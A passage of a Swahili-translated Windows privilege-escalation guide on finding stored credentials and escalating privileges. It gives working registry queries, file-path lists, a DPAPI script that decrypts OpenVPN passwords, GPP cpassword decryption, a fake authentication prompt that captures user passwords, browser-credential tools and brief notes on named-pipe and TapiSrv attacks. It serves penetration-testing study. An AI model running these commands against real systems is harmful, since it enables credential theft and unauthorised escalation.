Usakinishaji wa Openfire unaotumia database iliyopachikwa unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` na property ya `passwordKey` kwa pamoja. [Nyaraka za Openfire za user-provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa password zinaweza kuhifadhiwa kama maandishi wazi au kusimbwa fiche kwa ufunguo uliohifadhiwa kwenye property hiyo. Password iliyorejeshwa ni muhimu kwa escalation ikiwa tu bado ni halali kwa utambulisho wenye ruhusa zaidi; jina la faili pekee halithibitishi ufikiaji wa kusoma wala matumizi tena ya credential. Njia hiyo ni kidokezo cha inventory, kwa hiyo usijumuishe yaliyomo kwenye database au credentials kwenye matokeo ya kawaida ya enumeration.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kuonyesha port na interface ya bind zilizosanidiwa za admin console hata kama database ya nje inatumika. Openfire mara nyingi hu-bind admin console kwenye loopback; mtumiaji wa ndani bado anaweza kufikia anwani hiyo ikiwa listener inaendeshwa. Kagua listener halisi, role ya admin iliyoidhinishwa, sera ya kupakia plugin na utambulisho wa huduma ya Openfire kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kufanya code ya plugin iendeshwe katika muktadha wa huduma, ambayo inaweza kuwa na ruhusa nyingi ikiwa huduma inaendeshwa kama LocalSystem. Password inayolingana ya akaunti au njia ya usanidi inayosomeka pekee haithibitishi ufikiaji wa admin console au utekelezaji wa code. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [property ya API ya kupakia plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa seva ya usimamizi wa uchunguzi wa kidijitali

Usanidi wa seva ya Velociraptor, ambao kwa kawaida huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya CA ya ndani. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kusoma ufunguo huo, anaweza kuunda cheti cha mteja cha API. Kama hilo litasababisha ruhusa za juu zaidi hutegemea roles za watumiaji za seva, ufikikaji wa API na utambulisho ambao seva au agent lengwa huendeshwa nao. Usanidi wa mteja una nyenzo tofauti; kuupata hakuthibitishi ufikiaji wa CA ya seva. Baadhi ya deployments huhifadhi private key ya CA nje ya mtandao, hivyo usanidi wa seva unaosomeka unaweza pia kukosa ufunguo wa kusaini.

Kwenye seva ya Windows, kagua ACL ya usanidi wa **seva** katika saraka yake ya usakinishaji na nakala zozote za chelezo zilizolindwa. Mahali panapowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa ya huduma ikiwa ni tofauti. Thibitisha kuwa utambulisho wa sasa unaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha private key kwenye log au matokeo ya enumeration. Workflow ya vendor ya `config api_client` hutumia ufunguo wa CA kutoa cheti cha mteja, lakini role inayofanya kazi upande wa seva inahitajika pia; kuunda au kubadilisha role kunaweza kuhitaji ruhusa ya kuandika kwenye datastore au kuwasha upya huduma. Utambulisho wa seva wenye ruhusa za juu uliopo tayari unaweza kutoa njia hata kama ruhusa hizo za kuandika hazipatikani. API queries zenye haki za kutekeleza huendeshwa katika muktadha husika wa seva au agent, ambao unaweza kuwa na ruhusa nyingi.

Linda usanidi wa seva na nakala za chelezo kwa ACL zenye vizuizi, hifadhi ufunguo wa kusaini wa CA nje ya mtandao inapowezekana, na punguza roles za API pamoja na ufikiaji wa listener. Tazama [nyaraka za API za Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni session manager tofauti. Hifadhi yake iliyosimbwa kwa njia fiche inaweza kuwa `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ilhali nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa kwingine. [Mwongozo wa uhamishaji wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema uhamishaji husimbwa kwa nenosiri na unaweza kuwa na sessions, keys, scripts, tags, na relationships; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha hifadhi asili. Kagua ruhusa za faili na njia zake kwanza. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kuwa credential yoyote iliyohifadhiwa bado inafanya kazi au ina privileges za juu zaidi.

### Funguo za Host za SSH za PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys kwenye registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa ufunguo wa SSH uliohifadhiwa. Ufunguo huo umehifadhiwa kwa njia fiche, lakini unaweza kufichuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze yenyewe kompyuta inapowashwa, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda funguo kadhaa za ssh, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikuonyesha matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo zisizolingana.

### Faili zisizosimamiwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi ukitumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala rudufu za SAM na SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na hive za `SAM`, `SECURITY`, na `SYSTEM` za offline. Kipaumbele kiwe saraka za backup au image zinazoweza kufikiwa ndani ya mfumo, na kagua **majina ya faili zilizomo** kwenye image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hive zimefichuka, na image za kawaida za `install.wim`, `boot.wim`, na recovery mara nyingi hupotosha. SMB share ni njia tofauti ya ufikiaji na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya wigo wa kazi. Tazama mwongozo wa Microsoft kuhusu [image za Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Vitambulisho vya Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa kwenye akiba

Kipengele kilipatikana hapo awali kilichoruhusu kusambaza akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML katika SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nywila zilizo ndani ya GPP hizi, zilizosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliokuwa umeandikwa hadharani, zingeweza kufumbuliwa na mtumiaji yeyote aliyeidhinishwa. Hili lilileta hatari kubwa, kwani lingeweza kuruhusu watumiaji kupata upendeleo wa juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ya kutafuta faili za GPP zilizohifadhiwa kwenye akiba ya ndani zenye sehemu ya "cpassword" isiyo tupu. Inapopata faili kama hiyo, kazi hiyo hufumbua nenosiri na kurudisha object maalum ya PowerShell. Object hii inajumuisha maelezo kuhusu GPP na mahali faili ilipo, ili kusaidia kutambua na kurekebisha athari hii ya kiusalama.

Tafuta faili hizi katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kufumbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye credentials:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Kumbukumbu za backup katika webroot ya IIS

Backup ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayohudumia tovuti inaweza kufichua faili za awali za usanidi na credentials zinazoweza kutumika tena. Kagua physical path iliyosanidiwa ya tovuti na kama kumbukumbu hiyo inafikika kweli kupitia HTTP kabla ya kuichukulia kama exposure. Path chaguomsingi `C:\inetpub\wwwroot` ni uwezekano tu. Orodha ya haraka ya ndani inaweza kuonyesha majina na ukubwa bila kufungua kumbukumbu:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la archive halithibitishi kuwa ina siri au kwamba credential iliyopatikana inatoa privilege ya juu.

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Kumbukumbu

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba taarifa za kuingia

Unaweza **kumwomba mtumiaji aweke taarifa zake za kuingia au hata taarifa za kuingia za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kumuomba** mteja moja kwa moja **taarifa zake za kuingia** ni **hatari sana**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana ambazo wakati fulani zilikuwa na **passwords** katika **clear-text** au **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Hifadhidata za Password Safe v3 kwa kawaida hutumia kiendelezi `.psafe3`. Ichukulie jina la faili linalolingana kuwa huenda ni vault iliyosimbwa kwa njia fiche; kuwepo kwake hakuthibitishi kwamba unaweza kuisoma, kuifungua, au kutumia credentials zozote zilizohifadhiwa humo. Kagua profaili za watumiaji zinazoweza kufikiwa na mizizi ya file-sharing iliyosanidiwa unapochunguza mahali faili hizo zimehifadhiwa.

Faili ya KeePass `.kdbx` inayosomeka vilevile ni kidokezo tu cha vault iliyosimbwa kwa njia fiche. Kuifungua kunahitaji master-password halisi na faili yoyote ya key au vipengele vya akaunti vilivyosaniwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya LM:NT hash kwenye ingizo, thibitisha akaunti iliyotajwa na kama NT hash ni ya sasa na inakubaliwa na huduma ya NTLM ya lengo kabla ya kufikiria [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault halitoi haki za Administrator au SYSTEM lenyewe; ufikiaji wa huduma ya mbali, haki za akaunti, na hatua yoyote tofauti ya kutekeleza huduma lazima pia zipatikane. Orodha ya mali inapaswa kuripoti njia ya vault na kama inaweza kusomeka, si kuchapisha hifadhidata au credentials zilizohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credentials kwenye RecycleBin

Kagua vipengee vinavyoweza kufikiwa kwenye Recycle Bin kwa nakala rudufu na kumbukumbu za usanidi zilizofutwa, pamoja na faili ambazo majina yake yanataja credentials waziwazi. Nakala rudufu ya `.7z`, `.zip`, au `.rar` inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa kwenye rekodi ya `$I`, na faili iliyofutwa kama ingizo lake sambamba la `$R`; kagua metadata na ruhusa ya utambulisho wa sasa ya kusoma faili kabla ya kufungua kumbukumbu. Mwonekano hutegemea volume, SID ya mtumiaji na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kwamba hakuna nakala rudufu inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama kiashiria kinachostahili kukaguliwa, si uthibitisho kwamba lina siri halali.

`.pfx` iliyofutwa na inayoweza kufikiwa pia inaweza kuwa kiashiria cha **code-signing**. Ikiwa ina private key inayoweza kufikiwa, key hiyo inaweza kutumika kusaini script ya PowerShell iliyobadilishwa; [PowerShell huhitaji certificate ya code-signing yenye private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [sheria za AppLocker za publisher hutathmini utambulisho wa msaini na wigo wa sheria](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti tofauti huhitaji utambulisho wa sasa uweze kurekebisha script husika, sheria inayotumika ikubali signature inayotokana nayo kwa script na akaunti lengwa, na scheduled task au programu nyingine yenye privileges za juu iendeshe script hiyo. Jina la faili la `.pfx`, subject ya certificate, au script inayoweza kuandikwa pekee havithibitishi mnyororo huo. Kagua metadata, ACLs, sera na command ya scheduled task kabla ya kufungua nyenzo za private key au kuanzisha task.

Pia kagua hifadhidata za profile za messaging client zinazoweza kufikiwa, notes na faili zilizopokewa ili kutafuta vidokezo vya credentials. Export ya urejeshaji wa BitLocker inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya nakala rudufu iliyopewa jina. Nyenzo hizo zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa kwa njia fiche, iliyo na nakala rudufu za zamani; kagua volume na kumbukumbu hiyo ikiwa tu unaidhinishwa. Ikiwa nakala rudufu ina `NTDS.dit`, kurejesha credentials za domain offline kunahitaji pia hive ya `SYSTEM` inayolingana, kama ilivyoelezwa kwenye [workflow ya nakala rudufu na privileged-groups](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kuwepo kwa recovery key inayoweza kutumika au nakala rudufu ya domain.

Ili **kurejesha passwords** zilizohifadhiwa na programu kadhaa, unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Registry keys nyingine zinazowezekana kuwa na credentials**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Toa OpenSSH keys kutoka registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kutafuta databases ambamo passwords kutoka **Chrome, Edge, au Firefox** huhifadhiwa.\
Pia angalia historia, bookmarks na vipendwa vya vivinjari ili kubaini kama **passwords zimehifadhiwa** humo.

Kwa profile ya kawaida ya **Default** ya Edge ya mtumiaji wa sasa, `Login Data` iko chini ya `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, na `Local State` iko kwenye folda yake mama ya `User Data`. [Microsoft inaeleza eneo la kawaida la profile](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); profile nyingine au sera ya `UserDataDir` inaweza kuhamisha eneo hilo. Kuwepo kwa faili ni kidokezo tu cha mahali pa kuhifadhi credentials: thibitisha kuwa faili zinaweza kusomwa, kwamba una muktadha wa DPAPI wa mtumiaji husika au key material nyingine iliyoidhinishwa, na kama login iliyohifadhiwa ni ya akaunti yenye ruhusa za juu zaidi. Kuhesabu njia za faili pekee hakuhitaji kufungua database au kuchapisha passwords zilizofumbuliwa.

Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kuwa `key4.db` na `logins.json` za profile ni faili zinazohusiana za key na login zilizofumbwa. Kuwepo kwake ni kidokezo tu: angalia kama faili zote mbili zinaweza kusomwa, kama kuna entries zilizohifadhiwa, na kama Primary Password inalinda key kabla ya kuhitimisha kuwa credentials zinaweza kutumika. Ikiwa credential iliyopatikana ni ya akaunti ya domain, kagua kando ruhusa halisi za akaunti hiyo za kudhibiti vikundi na [ruhusa za kusoma au kufumbua password za LAPS za kikundi](../active-directory-methodology/laps.md); artifacts za kivinjari pekee hazithibitishi njia ya kupata ruhusa za administrator.

Tools za kutoa passwords kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)** na kila kipengele hutoa utendaji kupitia interface moja au zaidi, zinazotambuliwa kwa interface IDs (IIDs).

Classes na interfaces za COM hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry child ya **InProcServer32**, yenye **default value** inayoelekeza kwenye **DLL**, na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

Kimsingi, ukiweza **kubadilisha DLL yoyote** itakayotekelezwa, unaweza **kuongeza privileges** ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama mbinu ya persistence, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa Password kwenye faili na registry**

**Tafuta yaliyomo kwenye faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili kwa jina maalum**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta majina ya key na nywila kwenye registry**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoiunda ili **kuendesha kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **majina ya watumiaji** na **nywila** za zana mbalimbali zinazohifadhi data hii kama maandishi ya kawaida (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **process inayoendeshwa kama SYSTEM inafungua process mpya** (`OpenProcess()`) ikiwa na **ufikiaji kamili**. Process hiyo hiyo **pia inaunda process mpya** (`CreateProcess()`) **yenye privileges za chini, lakini inayorithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **ufikiaji kamili wa process yenye privileges za chini**, unaweza kuchukua **handle iliyo wazi ya process yenye privileges iliyoundwa** kwa `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu ili kupata maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili lingine kwa maelezo kamili zaidi kuhusu jinsi ya kujaribu na kutumia vibaya handles nyingine zilizo wazi za processes na threads zinazorithiwa zikiwa na viwango tofauti vya permissions (si ufikiaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zilizoshirikiwa, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows ina kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo majukumu hufafanuliwa kama **named pipe server** na **named pipe client**.

**Client** anapotuma data kupitia pipe, **server** aliyeanzisha pipe anaweza **kuchukua utambulisho** wa **client**, ikiwa ana haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileges** inayowasiliana kupitia pipe unayoweza kuiga kunakupa fursa ya **kupata privileges za juu zaidi** kwa kuchukua utambulisho wa process hiyo pindi inapowasiliana na pipe uliyoanzisha. Mwongozo wa kutekeleza shambulio kama hilo unapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo inaruhusu **kunasa mawasiliano ya named pipe kwa tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client aliyeidhinishwa kwa mbali anaweza kutumia vibaya njia ya matukio ya async inayotegemea mailslot ili kubadilisha `ClientAttach` kuwa **uandishi wa byte 4** wa kiholela kwenye faili yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za msimamizi wa Telephony na kupakia DLL yoyote kama huduma. Mchakato kamili:

- `ClientAttach` huku `pszDomainUser` ikiwa imewekwa kwenye njia iliyopo inayoweza kuandikwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kuandika matukio ya async.
- Kila tukio huandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` kwenda kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima ili kurudia uandishi uleule kwa uhakika.
